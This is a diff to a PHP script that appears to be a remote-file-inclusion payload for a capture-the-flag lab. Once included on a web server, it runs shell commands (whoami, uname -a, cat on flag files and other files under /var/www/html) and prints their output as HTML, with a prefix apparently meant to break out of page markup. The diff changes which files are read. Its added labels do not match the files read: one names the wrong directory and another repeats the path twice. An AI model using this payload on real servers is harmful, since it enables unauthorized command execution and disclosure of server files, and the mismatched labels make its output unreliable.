@@ -15,7 +15,8 @@
     $catflag1_output = `cat /var/www/html/rfi1/flag.php`;
     $catflag2a_output = `cat /var/www/html/rfi2/flag.php`;
     $catflag2_output = `cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php`;
-    $catflag3_output = `cat /var/www/html/transparent/flag.php`;
+    $catflag3_output = `cat /var/www/html/transparent/hi.php`;
+    $catflag4_output = `cat /var/www/html/transparent/index.html`;
     $uname_a = `uname -a`;
     ECHO "--"."><p><h4> This file executes the following commands on the web server.</h4></p>";
     ECHO "<div><ol><li>Who Am I: (\"whoami\")</li>";
@@ -49,8 +50,10 @@
     ECHO "<dd><pre>".$catflag2a_output."</pre></dd>";
     ECHO "<b><dt>Contents of /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php:</dt></b>";
     ECHO "<dd><pre>".$catflag2_output."</pre></dd>";
-    ECHO "<b><dt>Contents of /var/www/html/transparent/flag.php:</dt></b>";
+    ECHO "<b><dt>Contents of /var/www/html/rfi2/You_Cant_Find_This_Dir/hi.php:</dt></b>";
     ECHO "<dd><pre>".$catflag3_output."</pre></dd>";
+    ECHO "<b><dt>Contents of /var/www/html/transparent//var/www/html/transparent/index.html:</dt></b>";
+    ECHO "<dd><pre>".$catflag4_output."</pre></dd>";
     ECHO "<b><dt>uname -a:</b></dt>";
     ECHO "<dd>".$uname_a."</dd>";
 ?>
